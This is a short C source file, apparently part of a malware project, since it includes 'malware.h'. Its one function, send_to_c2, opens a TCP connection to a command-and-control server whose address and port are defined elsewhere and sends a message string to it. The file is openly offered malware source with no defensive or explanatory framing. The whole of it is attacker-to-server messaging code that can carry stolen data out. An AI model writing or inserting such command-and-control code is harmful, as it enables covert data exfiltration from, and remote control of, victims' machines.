#include "malware.h"

void send_to_c2(const char *msg)
{
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
        return;
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(C2_SERVER_PORT);
    if (inet_pton(AF_INET, C2_SERVER_IP, &server.sin_addr) <= 0) {
        close(sockfd);
        return;
    }
    if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) < 0) {
        close(sockfd);
        return;
    }
    send(sockfd, msg, strlen(msg), 0);
    close(sockfd);
}
